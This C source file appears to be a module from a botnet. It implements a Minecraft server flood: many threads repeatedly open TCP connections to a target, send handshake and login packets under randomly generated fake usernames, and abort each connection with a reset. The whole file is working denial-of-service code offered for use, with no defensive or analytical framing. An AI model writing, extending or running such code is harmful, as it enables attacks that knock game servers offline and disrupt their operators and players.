#include "../../bot.h"
#include "l4.h"
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

static const char *mc_prefix[] = {"xX_","XX_","_","Mr","Ms","Sir","Da","El","Pro","The","iTz","Its","xC"};
static const char *mc_suffix[] = {"_xX","_Xx","_","YT","OP","XD","PvP","Pro","MC","Craft","Build","Sky",
    "Fire","Dark","Star","King","Queen","Wolf","Lord","Night","Dragon","Slayer","Gamer","Noob",
    "Creeper","Ender","Hero","Zombie","Sword","Shield","Archer","Wizard","Ninja"};

static void write_varint(uint8_t *buf, int *pos, int32_t v) {
    uint32_t uv = (uint32_t)v;
    while (1) {
        uint8_t b = uv & 0x7F;
        uv >>= 7;
        if (uv) b |= 0x80;
        buf[(*pos)++] = b;
        if (!uv) break;
    }
}

void *mc_worker(void *arg) {
    target_t *t = arg;
    struct sockaddr_in addr;
    addr.sin_family = AF_INET; addr.sin_port = htons(t->port);
    inet_pton(AF_INET, t->ip, &addr.sin_addr);
    XorShift64 *rng = rng_new();
    time_t end = time(NULL) + t->sec;
    while (time(NULL) < end && running) {
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd < 0) continue;
        struct timeval tv = {5, 0};
        setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        if (connect(fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            close(fd); sleep_ms(10); continue;
        }
        uint8_t handshake[256];
        int pos = 0;
        write_varint(handshake, &pos, 754);
        write_varint(handshake, &pos, strlen(t->ip));
        memcpy(handshake+pos, t->ip, strlen(t->ip));
        pos += strlen(t->ip);
        handshake[pos++] = (uint16_t)(rng_next(rng) % 65536) >> 8;
        handshake[pos++] = (uint16_t)(rng_next(rng) % 65536);
        write_varint(handshake, &pos, 2);
        uint8_t pkt[512];
        int pp = 0;
        write_varint(pkt, &pp, pos);
        write_varint(pkt, &pp, 0);
        memcpy(pkt+pp, handshake, pos);
        pp += pos;
        write(fd, pkt, pp);
        char username[64];
        snprintf(username, sizeof(username), "%s%s%ld",
            mc_prefix[rng_next(rng) % 13], mc_suffix[rng_next(rng) % 32],
            (long)(rng_next(rng) % 999));
        uint8_t login[128];
        int lp = 0;
        write_varint(login, &lp, strlen(username));
        memcpy(login+lp, username, strlen(username));
        lp += strlen(username);
        uint8_t lpkt[256];
        int lpp = 0;
        write_varint(lpkt, &lpp, lp);
        write_varint(lpkt, &lpp, 0);
        memcpy(lpkt+lpp, login, lp);
        lpp += lp;
        write(fd, lpkt, lpp);
        struct linger l = {1, 0};
        setsockopt(fd, SOL_SOCKET, SO_LINGER, &l, sizeof(l));
        close(fd);
    }
    free(rng);
    return NULL;
}

void flood_minecraft(const char *target, int port, int sec) {
    target_t t; if (resolve_target(&t, target) < 0) return;
    t.port = port; t.sec = sec;
    int n = g_thread_count;
    pthread_t threads[n];
    for (int i = 0; i < n; i++)
        pthread_create(&threads[i], NULL, mc_worker, &t);
    for (int i = 0; i < n; i++)
        pthread_join(threads[i], NULL);
}
